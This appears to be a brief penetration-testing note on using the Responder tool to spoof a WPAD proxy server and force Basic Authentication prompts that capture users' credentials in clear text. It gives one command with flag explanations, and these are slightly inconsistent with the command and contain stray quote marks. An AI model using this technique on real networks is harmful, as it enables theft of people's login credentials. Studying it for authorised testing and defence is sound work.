    # Basic Authentication & WPAD


    WPAD is used in some corporate environments to automatically provide the internet
    proxy for web browsers. Many internet browsers have "auto-detect system proxy"
    set by default in their internet settings, they will seek out a WPAD server for
    a proxy address. We can enable WPAD server support in Responder to respond to
    these requests. If we use WPAD with the "Force Basic Authentication" option, responder
    prompts users with a login screen when they try to surf the web and grabs their
    creds in clear text.


    Command:


    ```

    responder -l eth0 -wbf

    --w" starts the WPAD Server

    --b" enables basic HTTP authentication

    --F forces authentication for WPAD (a login prompt)

    ```'
